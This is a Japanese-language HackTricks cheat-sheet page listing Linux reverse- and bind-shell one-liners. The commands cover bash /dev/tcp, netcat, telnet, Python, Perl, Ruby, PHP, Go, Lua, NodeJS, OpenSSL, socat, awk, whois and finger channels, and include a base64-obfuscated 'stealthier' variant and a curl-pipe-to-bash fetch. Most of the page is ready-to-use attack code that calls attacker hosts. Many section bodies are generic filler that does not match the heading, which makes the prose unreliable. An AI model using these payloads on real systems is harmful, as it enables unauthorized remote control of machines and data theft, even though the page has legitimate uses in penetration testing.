# シェル - Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて修正を迅速化しましょう。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**これらのシェルについて質問がある場合は、** [**https://explainshell.com/**](https://explainshell.com) **で確認できます。**

## フルTTY

**リバースシェルを取得したら、[**このページを読んでフルTTYを取得**](full-ttys.md)**してください。**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
他のシェルもチェックするのを忘れないでください：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh、およびbash。

### シンボルセーフシェル
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### シェルの説明

1. **`bash -i`**: このコマンドの部分は、対話型 (`-i`) のBashシェルを起動します。
2. **`>&`**: このコマンドの部分は、**標準出力 (`stdout`) と標準エラー (`stderr`) を同じ宛先にリダイレクトする**ための省略記法です。
3. **`/dev/tcp/<攻撃者のIP>/<ポート>`**: これは、指定したIPアドレスとポートへのTCP接続を表す特殊なファイルです。
* **出力とエラーストリームをこのファイルにリダイレクトすることで**、コマンドは対話型シェルセッションの出力を攻撃者のマシンに送信します。
4. **`0>&1`**: このコマンドの部分は、**標準入力 (`stdin`) を標準出力 (`stdout`) と同じ宛先にリダイレクトします**。

### ファイルを作成して実行する
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## フォワードシェル

Linuxマシンのウェブアプリで**RCE（リモートコード実行）**がある場合でも、Iptablesルールや他の種類のフィルタリングのために**リバースシェルを取得できない**場合があります。この「シェル」は、被害者のシステム内でパイプを使用してRCEを介してPTYシェルを維持することができます。\
コードは[**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)で見つけることができます。

次のように変更する必要があります：

* 脆弱なホストのURL
* ペイロードの接頭辞と接尾辞（あれば）
* ペイロードの送信方法（ヘッダー？データ？追加情報？）

その後、単に**コマンドを送信**するか、さらに**`upgrade`コマンドを使用**して完全なPTYを取得できます（パイプは約1.3秒の遅延で読み書きされます）。


## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)で確認してください。
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnetは、ネットワーク上のリモートシステムにアクセスするためのプロトコルです。通常、リモートシステムにログインするために使用されます。Telnetは、クライアントとサーバーの間でテキストベースの通信を提供します。

### Telnetの使用法

以下は、Telnetを使用してリモートシステムにアクセスする方法の一般的な手順です。

1. ターミナルまたはコマンドプロンプトを開きます。
2. `telnet`コマンドを使用して、リモートシステムに接続します。例：`telnet <IPアドレス> <ポート番号>`
3. ユーザー名とパスワードを入力してログインします。
4. リモートシステム上でコマンドを実行します。

### Telnetのセキュリティ上の問題

Telnetは、通信が暗号化されていないため、セキュリティ上のリスクがあります。パスワードや他の機密情報が平文で送信されるため、攻撃者によって傍受される可能性があります。そのため、Telnetはセキュアな通信プロトコル（例：SSH）に置き換えることが推奨されています。

### Telnetの代替手段

Telnetの代わりに、以下のようなセキュアなリモートシェル（SSH）を使用することをお勧めします。

- SSH（Secure Shell）
- PowerShell Remoting（Windows環境）
- Remote Desktop Protocol（RDP）（Windows環境）

これらの代替手段は、暗号化された通信を提供し、セキュリティ上のリスクを軽減します。
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**攻撃者**
```bash
while true; do nc -l <port>; done
```
コマンドを送信するには、それを書き留めて、Enterキーを押し、CTRL+Dキーを押します（STDINを停止するため）。

**被害者**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Pythonは、多くのハッカーにとって非常に人気のあるプログラミング言語です。Pythonは、シンプルで読みやすい構文を持ち、幅広い用途に使用することができます。Pythonは、ハッキングにおいても非常に強力なツールとなります。

Pythonを使用すると、さまざまなハッキングタスクを実行することができます。例えば、ネットワークスキャン、脆弱性スキャン、パスワードクラッキング、データの収集などです。Pythonは、これらのタスクを自動化するためのスクリプトを作成するのに非常に適しています。

Pythonには、さまざまなハッキングに関連するライブラリやモジュールがあります。例えば、`socket`モジュールを使用してネットワーク通信を行ったり、`requests`モジュールを使用してWebサイトからデータを取得したりすることができます。また、`paramiko`モジュールを使用してSSH接続を確立したり、`scapy`モジュールを使用してパケットキャプチャやパケット生成を行ったりすることもできます。

Pythonは、さまざまなプラットフォームで動作するため、ほとんどのオペレーティングシステムで使用することができます。また、Pythonの豊富なコミュニティとドキュメントにより、ハッキングに関する情報やサンプルコードを簡単に見つけることができます。

Pythonは、ハッキングにおいて非常に強力なツールであり、ハッカーにとって重要なスキルです。Pythonの基本的な構文とライブラリを学び、ハッキングのためのスクリプトを作成することで、効率的かつ効果的なハッキング作業を行うことができます。
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perlは、高レベルのプログラミング言語であり、シェルスクリプトの作成やデータ処理に広く使用されています。Perlは、Linuxシステムでのハッキングにおいて非常に便利なツールです。

Perlスクリプトを使用すると、システム上のファイルやディレクトリの操作、ネットワーク通信の制御、データの解析など、さまざまなタスクを自動化することができます。

Perlスクリプトを実行するには、まずPerlインタプリタをインストールする必要があります。次に、スクリプトファイルを作成し、実行権限を付与します。スクリプトを実行するには、ターミナルで`perl`コマンドを使用します。

Perlスクリプトは、シェルスクリプトと同様に、コマンドライン引数を受け取ることができます。これにより、スクリプトの動作をカスタマイズすることができます。

Perlは、強力な文字列操作機能を備えており、正規表現を使用してパターンマッチングや文字列の置換を行うことができます。これにより、データの解析や変換が容易になります。

Perlは、ネットワークプログラミングにも適しており、ソケットを使用してTCP/IP通信を行うことができます。これにより、ネットワーク上のサービスやポートのスキャン、データの送受信などを行うことができます。

Perlは、Linuxシステムでのハッキングにおいて非常に強力なツールです。その柔軟性と多機能性により、さまざまなタスクを効率的に実行することができます。
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## ルビー

Rubyは、オブジェクト指向のスクリプト言語であり、多くのプログラミングタスクを簡単に実行するための強力なツールです。Rubyは、シンプルで読みやすい構文を持ち、柔軟性と拡張性に優れています。Rubyは、Webアプリケーションの開発や自動化スクリプトの作成など、さまざまな用途に使用されています。

Rubyのシェルスクリプトは、Rubyスクリプトを実行するための便利な方法です。シェルスクリプトを使用すると、コマンドラインからRubyスクリプトを直接実行できます。これにより、Rubyの強力な機能を活用しながら、簡単にタスクを自動化することができます。

以下は、Rubyシェルスクリプトの例です。

```ruby
#!/usr/bin/env ruby

puts "Hello, World!"
```

このシェルスクリプトは、"Hello, World!"というメッセージを表示するだけですが、Rubyの基本的な構文と機能を示しています。シェルスクリプトの先頭には、`#!/usr/bin/env ruby`という行があります。これは、このスクリプトがRubyで書かれていることを示しています。

シェルスクリプトを実行するには、まず実行権限を与える必要があります。次に、ターミナルで以下のコマンドを実行します。

```bash
$ chmod +x script.rb
$ ./script.rb
```

これにより、Rubyシェルスクリプトが実行され、"Hello, World!"というメッセージが表示されます。

Rubyのシェルスクリプトは、さまざまなタスクを自動化するための強力なツールです。Rubyの豊富なライブラリと機能を活用しながら、効率的で柔軟なスクリプトを作成することができます。
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP（Hypertext Preprocessor）は、Web開発に広く使用されるスクリプト言語です。PHPは、サーバーサイドで実行され、HTMLと組み合わせて動的なWebページを生成するために使用されます。

PHPシェルは、PHPスクリプトを使用してリモートサーバーにアクセスするためのツールです。PHPシェルを使用すると、リモートサーバー上でコマンドを実行したり、ファイルを操作したりすることができます。

PHPシェルの一般的な使用法は、以下の通りです。

1. リモートサーバーにアクセスするための認証情報を取得します。
2. PHPシェルをリモートサーバーにアップロードします。
3. PHPシェルを使用して、リモートサーバー上でコマンドを実行したり、ファイルを操作したりします。

PHPシェルは、Webアプリケーションの脆弱性を悪用するために使用されることもあります。攻撃者は、脆弱なWebアプリケーションにPHPシェルをアップロードし、リモートサーバー上でコマンドを実行したり、データベースにアクセスしたりすることができます。

PHPシェルは、Webアプリケーションのセキュリティテストや侵入テストにおいて、攻撃者の視点からのテストを行うために使用されることもあります。セキュリティ専門家は、PHPシェルを使用して、脆弱な箇所を特定し、適切な対策を講じることができます。

PHPシェルは、Web開発者やセキュリティ専門家にとって重要なツールですが、悪意のある攻撃者によって悪用される可能性もあるため、適切なセキュリティ対策が必要です。
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Javaは、オブジェクト指向プログラミング言語であり、広く使用されています。Javaは、セキュリティ、ポータビリティ、パフォーマンスの面で優れた特徴を持っています。Javaは、クロスプラットフォームで動作するため、さまざまなデバイスやシステムで利用できます。

Javaのセキュリティは、その設計と実装によって強化されています。Javaは、メモリ管理、例外処理、アクセス制御などのセキュリティ機能を提供します。また、Javaのセキュリティモデルは、アプリケーションの信頼性と機密性を確保するために使用されます。

Javaのポータビリティは、プラットフォームに依存しない特徴です。Javaは、Java仮想マシン（JVM）上で実行されるため、異なるオペレーティングシステムやハードウェア上で動作することができます。これにより、Javaアプリケーションは、異なる環境で簡単に移植および実行できます。

Javaのパフォーマンスは、高速な実行と効率的なリソース管理によって向上します。Javaは、JITコンパイラによるコード最適化やガベージコレクションによるメモリ管理などの機能を提供します。これにより、Javaアプリケーションは高速で効率的な実行が可能です。

Javaは、広範なライブラリとフレームワークを提供しており、開発者が効率的にアプリケーションを構築できるようにサポートしています。また、Javaはオープンソースコミュニティによってサポートされており、新しい機能やセキュリティパッチが定期的に提供されます。

Javaは、企業や組織で広く使用されており、多くのビジネスアプリケーションやウェブアプリケーションがJavaで開発されています。Javaの人気と普及度は、その信頼性、セキュリティ、パフォーマンスによるものです。
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat is a powerful networking utility that is included in the Nmap suite. It is designed to be a flexible and reliable tool for network exploration and security auditing. Ncat provides a wide range of features, including port scanning, banner grabbing, and data transfer.

### Installation

Ncat is available for various operating systems, including Linux, Windows, and macOS. To install Ncat on Linux, you can use the package manager of your distribution. For example, on Ubuntu, you can run the following command:

```
sudo apt-get install nmap
```

### Basic Usage

Ncat can be used for a variety of purposes, such as establishing a simple TCP or UDP connection, creating a secure tunnel, or transferring files between systems. Here are some examples of basic usage:

- To establish a TCP connection to a remote host on a specific port:

```
ncat <host> <port>
```

- To listen for incoming TCP connections on a specific port:

```
ncat -l <port>
```

- To transfer a file from one system to another using TCP:

```
ncat -l <port> > file.txt
ncat <host> <port> < file.txt
```

### Advanced Features

Ncat also offers advanced features that can be useful for network troubleshooting and penetration testing. Some of these features include:

- SSL/TLS encryption for secure communication
- Proxy support for connecting through HTTP, SOCKS4, or SOCKS5 proxies
- Port forwarding for redirecting network traffic
- Scripting support for automating tasks

To learn more about Ncat and its advanced features, you can refer to the official documentation or explore the available command-line options by running `ncat --help`.

### Conclusion

Ncat is a versatile networking utility that can be a valuable tool for network exploration and security auditing. Its wide range of features and ease of use make it a popular choice among hackers and security professionals. Whether you need to establish a simple connection or perform advanced network tasks, Ncat has you covered.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは、攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Luaは、シンプルで効率的なスクリプト言語です。Luaは、組み込みシステムやゲーム開発など、さまざまな領域で使用されています。Luaは、柔軟性と拡張性があり、C言語との統合も容易です。

Luaスクリプトを実行するためには、Luaインタプリタが必要です。Luaインタプリタは、コマンドラインから直接実行することも、Luaスクリプトを実行するためのシェルスクリプトを作成することもできます。

以下は、Luaスクリプトを実行するための基本的な手順です。

1. Luaインタプリタをインストールします。インストール方法は、使用しているオペレーティングシステムによって異なります。

2. テキストエディタを使用して、Luaスクリプトファイルを作成します。拡張子は通常、`.lua`です。

3. コマンドラインで、以下のコマンドを入力してLuaインタプリタを起動します。

   ```
   lua
   ```

4. Luaインタプリタが起動したら、以下のコマンドを入力してLuaスクリプトを実行します。

   ```
   dofile("スクリプトファイル.lua")
   ```

   スクリプトファイルのパスは、実際のファイルの場所に応じて適切に指定してください。

Luaスクリプトは、変数の宣言、条件分岐、ループ、関数の定義など、一般的なプログラミング機能をサポートしています。また、Luaは、C言語との統合も容易であり、C言語で書かれた関数をLuaスクリプトから呼び出すこともできます。

Luaは、シンプルで使いやすいスクリプト言語であり、さまざまな用途に適しています。Luaの学習リソースやコミュニティも豊富であり、効果的なスクリプト開発に役立ちます。
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJSは、非同期イベント駆動型のJavaScriptランタイム環境です。NodeJSは、サーバーサイドでのアプリケーション開発に広く使用されています。NodeJSは、高速なネットワーキングと並行処理をサポートし、スケーラブルなアプリケーションの構築に適しています。

NodeJSを使用すると、シェルスクリプトを実行することができます。シェルスクリプトは、コマンドラインで実行される一連のコマンドです。NodeJSを使用すると、シェルスクリプトを自動化し、効率的に実行することができます。

以下は、NodeJSを使用してシェルスクリプトを実行する方法の例です。

```javascript
const { exec } = require('child_process');

exec('ls -la', (error, stdout, stderr) => {
  if (error) {
    console.error(`エラーが発生しました: ${error}`);
    return;
  }
  console.log(`標準出力: ${stdout}`);
  console.error(`標準エラー出力: ${stderr}`);
});
```

上記の例では、`ls -la`コマンドを実行しています。`exec`関数は、コマンドを非同期に実行し、結果をコールバック関数で取得します。エラーが発生した場合は、エラーメッセージが表示されます。標準出力と標準エラー出力は、それぞれ`stdout`と`stderr`として表示されます。

NodeJSを使用してシェルスクリプトを実行することで、さまざまなタスクを自動化し、効率的に処理することができます。
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

攻撃者（Kali）
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
被害者
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### バインドシェル
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### リバースシェル

A reverse shell is a type of shell in which the target machine initiates the connection to the attacker's machine. This allows the attacker to gain remote access to the target machine and execute commands on it.

To establish a reverse shell, the attacker typically needs to have a listener running on their machine and a payload installed on the target machine. The payload is usually a piece of code or a script that, when executed on the target machine, connects back to the attacker's machine.

Once the connection is established, the attacker can interact with the target machine's command prompt and execute commands as if they were physically present on the machine. This can be useful for various purposes, such as gaining unauthorized access, exfiltrating data, or pivoting to other machines on the network.

There are various ways to create a reverse shell, depending on the operating system and network environment. Common methods include using netcat, creating a reverse shell with a programming language like Python or Perl, or using tools specifically designed for creating reverse shells.

It is important to note that using reverse shells for unauthorized access or malicious purposes is illegal and unethical. Reverse shells should only be used for legitimate purposes, such as penetration testing or network administration, with proper authorization.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awkは、テキスト処理のための強力なプログラミング言語です。Awkは、行単位でテキストを処理し、パターンに一致する行を選択し、指定されたアクションを実行することができます。Awkは、Linuxシェルスクリプト内で使用されることが一般的ですが、単独のAwkスクリプトとしても実行することができます。

Awkスクリプトは、次のような構造を持っています。

```awk
pattern { action }
```

- `pattern`は、行が一致する必要がある条件を指定します。パターンが指定されない場合、すべての行が一致します。
- `action`は、パターンに一致する行に対して実行されるコマンドまたはコマンドブロックです。

Awkは、テキストファイルの内容を処理するための多くの組み込み関数と変数を提供しています。これにより、テキストのフィールド分割、パターンマッチング、算術演算、条件分岐などの操作が可能になります。

Awkの基本的な使用法は次のとおりです。

```bash
awk 'pattern { action }' file.txt
```

- `pattern`は、行が一致する必要がある条件を指定します。
- `action`は、パターンに一致する行に対して実行されるコマンドまたはコマンドブロックです。
- `file.txt`は、処理するテキストファイルのパスです。

Awkは、テキスト処理において非常に便利なツールであり、データの抽出、変換、集計などのさまざまなタスクに使用することができます。
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
Fingerは、ユーザーの情報を取得するために使用されるツールです。Fingerサービスは、通常、ユーザー名を指定してユーザーの詳細情報を表示します。この情報には、ユーザー名、フルネーム、ログイン時間、および最後のログイン場所が含まれる場合があります。

Fingerコマンドは、以下のように使用されます。

```
finger [username]@[hostname]
```

ユーザー名を指定すると、Fingerはそのユーザーに関する情報を表示します。ホスト名を指定すると、そのホスト上のすべてのユーザーの情報を表示します。

Fingerは、情報収集フェーズでの便利なツールですが、セキュリティ上のリスクも伴います。ユーザー名やログイン情報が公開される可能性があるため、慎重に使用する必要があります。

**防御策**

Fingerサービスを無効にするか、アクセスを制限することで、Fingerによる情報漏洩を防ぐことができます。また、ユーザー名やログイン情報を公開しないようにするために、適切なアクセス制御とセキュリティポリシーを実施することも重要です。
```bash
while true; do nc -l 79; done
```
コマンドを送信するには、それを書き留めて、Enterキーを押し、CTRL+Dキーを押します（STDINを停止するため）。

**被害者**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawkは、Linuxシェルスクリプト内で使用されるパワフルなテキスト処理ツールです。Gawkは、パターンスキャンと処理、データの抽出、変換、およびレポートの生成など、さまざまなタスクを実行するために使用されます。

Gawkは、コマンドラインから直接実行することも、シェルスクリプト内で使用することもできます。Gawkは、テキストファイルを入力として受け取り、指定されたパターンに一致する行を処理します。Gawkは、パターンに一致する行を見つけると、指定されたアクションを実行します。

Gawkは、柔軟なパターンマッチング機能を提供し、正規表現を使用してパターンを指定することができます。また、Gawkは、変数、配列、制御構造などの高度なプログラミング機能もサポートしています。

Gawkは、テキストデータの処理において非常に便利であり、データの抽出、変換、およびレポートの生成などのタスクを効率的に実行することができます。Gawkの強力な機能を活用することで、テキストデータの解析と処理を迅速かつ効果的に行うことができます。
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

最もシンプルなリバースシェルの形式の1つは、xtermセッションです。以下のコマンドはサーバー上で実行する必要があります。それはあなた（10.0.0.1）にTCPポート6001で接続しようとします。
```bash
xterm -display 10.0.0.1:1
```
以下のコマンドを使用して、受信するxtermをキャッチします。X-Serverを起動します（:1 - TCPポート6001でリッスンします）。これを行う方法の1つは、Xnestを使用することです（システム上で実行する必要があります）:

```bash
Xnest :1
```

次に、xtermを起動し、X-Serverに接続します。以下のコマンドを使用します:

```bash
xterm -display :1
```

これにより、X-Server上で実行されているxtermが表示されます。
```bash
Xnest :1
```
以下のコマンドを実行して、ターゲットがあなたに接続することを許可する必要があります（このコマンドはあなたのホスト上でも実行されます）:
```bash
xhost +targetip
```
## Groovy

by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注意: Javaの逆シェルもGroovyで動作します。
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## 参考文献

{% embed url="https://highon.coffee/blog/reverse-shell-cheat-sheet/" %}

{% embed url="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell" %}

{% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できます。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリまで、クラウドシステム全体にわたる問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

